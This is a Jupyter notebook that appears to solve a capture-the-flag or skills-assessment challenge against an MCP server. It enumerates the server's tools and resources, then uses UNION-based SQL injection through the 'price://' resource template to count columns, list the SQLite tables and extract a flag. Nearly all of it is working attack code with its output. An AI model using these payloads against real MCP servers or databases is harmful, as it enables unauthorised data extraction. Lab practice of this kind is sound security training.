In [1]:
%pip install -q fastmcp


[notice] A new release of pip is available: 26.1.2 -> 26.2.1
[notice] To update, run: pip install --upgrade pip
Note: you may need to restart the kernel to use updated packages.


In [3]:
from fastmcp import Client
from urllib.parse import quote

TARGET = "172.17.0.2"
PORT   = 8000

MCP_URL = f"http://154.57.164.78:36216/mcp/"
print("Connecting to:", MCP_URL)

Connecting to: http://154.57.164.78:36216/mcp/


In [10]:
async def read_res(uri: str):
    async with Client(MCP_URL) as client:
        try:
            r = await client.read_resource(uri)
            return r[0].text
        except Exception as e:          # <-- Exception, not Exceptions
            return f"[-] {e}"

async def call_tool(name: str, args: dict):
    async with Client(MCP_URL) as client:
        try:
            r = await client.call_tool(name, args)
            return r.content[0].text
        except Exception as e:
            return f"[-] {e}"

async def enumerate_server():
    async with Client(MCP_URL) as client:
        resources = await client.list_resources()
        templates = await client.list_resource_templates()
        tools = await client.list_tools()

    print("RESOURCES")
    for r in resources:
        print("  *", r.name, "->", (r.description or "").strip())
    print("\nRESOURCE TEMPLATES")
    for t in templates:
        print("  *", t.uriTemplate, "->", (t.description or "").strip())
    print("\nTOOLS")
    for t in tools:
        params = ",".join((t.inputSchema.get("properties") or {}).keys())
        print(f"  * {t.name}({params}) -> {(t.description or '').strip()}")

print("helpers ready")

helpers ready


In [11]:
await enumerate_server()

RESOURCES
  * get_logs -> Provide the MCP server logs.
  * get_items -> Fetch all available items.

RESOURCE TEMPLATES
  * quantity://{item} -> Fetch item quantity from quantity API.

Keyword arguments:
item -- the item to fetch the quantity for.
  * price://{item} -> Fetch item price from price API.

Keyword arguments:
item -- the item to fetch the price for.

TOOLS
  * execute_server_command(command) -> Execute a safe command on the server.

Keyword arguments:
command -- the command to execute (one of 'date', 'whoami', 'uptime')
  * fetch_price_data(url) -> Fetch price data from an external URL.

Keyword arguments:
url -- the url to fetch data from.


In [12]:
print(await read_res("resource://logs"))
print("-" * 60)
print(await read_res("resource://items"))

2025-05-12 14:56:59.941202: MCP server starting...
2025-05-12 14:57:00.183027: Startup complete.
2025-05-12 14:58:38.832220: Getting price for item 'banana'
2025-05-12 14:58:57.657254: Executing server command 'date'
2025-05-12 14:58:57.660863: Getting price for item 'banana'
2025-05-12 14:59:15.738618: Executing server command 'uptime'
2025-05-12 14:59:15.741989: Getting price for item 'apple'
2025-05-12 14:59:42.669495: Executing server command 'whoami'
2025-05-12 15:02:48.047280: Error fetching item quantity for item 'watremelon': 'NoneType' object is not subscriptable2026-10-15 09:49:40.300297: Getting all items
2026-10-15 09:49:59.729717: Fetching quantity for item 'asd!'
2026-10-15 09:49:59.735044: Error fetching item quantity. Requests details: 'http://localhost/api/item/asd!' {'Content-Type': 'application/json', 'User-Agent': 'MCP Server 1.0.0', 'Authorization': 'Bearer [REDACTED]'}

------------------------------------------------------------
[["banana"],["apple"],["pineapple"

In [9]:
for bad in ["asd!", "'", "<>", "%00"]:
    print(f"=== quantity://{bad} ===")
    print(await read_res(f"quantity://{bad}"))
    print()

=== quantity://asd! ===


NameError: name 'Exceptions' is not defined

In [17]:
async def sqli(fragment: str):
    uri = "price://" + fragment.replace(" ", "%20")
    print("URI:", uri)
    return await read_res(uri)

print(await sqli("banana"))

URI: price://banana
1.09


In [18]:
for n in range(1, 6):
    cols = ",".join(str(i) for i in range(1, n + 1))
    print(f"=== {n} column(s) ===")
    print(await sqli(f"x' UNION SELECT {cols}--"))
    print()

=== 1 column(s) ===
URI: price://x'%20UNION%20SELECT%201--
1

=== 2 column(s) ===
URI: price://x'%20UNION%20SELECT%201,2--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%201,2--": Price API Error

=== 3 column(s) ===
URI: price://x'%20UNION%20SELECT%201,2,3--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%201,2,3--": Price API Error

=== 4 column(s) ===
URI: price://x'%20UNION%20SELECT%201,2,3,4--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%201,2,3,4--": Price API Error

=== 5 column(s) ===
URI: price://x'%20UNION%20SELECT%201,2,3,4,5--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%201,2,3,4,5--": Price API Error



In [19]:
# 5) Tables
print("--- tables (information_schema) ---")
print(await sqli("x' UNION SELECT group_concat(table_name) FROM information_schema.tables--"))

print("\n--- tables (sqlite) ---")
print(await sqli("x' UNION SELECT group_concat(name) FROM sqlite_master WHERE type='table'--"))

--- tables (information_schema) ---
URI: price://x'%20UNION%20SELECT%20group_concat(table_name)%20FROM%20information_schema.tables--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%20group_concat(table_name)%20FROM%20information_schema.tables--": Price API Error

--- tables (sqlite) ---
URI: price://x'%20UNION%20SELECT%20group_concat(name)%20FROM%20sqlite_master%20WHERE%20type='table'--
items,flag


In [20]:
print(await sqli("x' UNION SELECT group_concat(name) FROM pragma_table_info('flag')--"))


URI: price://x'%20UNION%20SELECT%20group_concat(name)%20FROM%20pragma_table_info('flag')--
ID,flag


In [21]:
print(await sqli("x' UNION SELECT group_concat(COL) FROM flag--"))

URI: price://x'%20UNION%20SELECT%20group_concat(COL)%20FROM%20flag--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%20group_concat(COL)%20FROM%20flag--": Price API Error


In [22]:
# dump every column of the first row, concatenated
print(await sqli("x' UNION SELECT group_concat(flag.*) FROM flag--"))   # may not parse; fallback below

URI: price://x'%20UNION%20SELECT%20group_concat(flag.*)%20FROM%20flag--
[-] Error reading resource from template "price://x'%20UNION%20SELECT%20group_concat(flag.*)%20FROM%20flag--": Price API Error


In [23]:
print(await sqli("x' UNION SELECT flag FROM flag--"))

URI: price://x'%20UNION%20SELECT%20flag%20FROM%20flag--
[REDACTED]


In [ ]:
# skill aseesmnet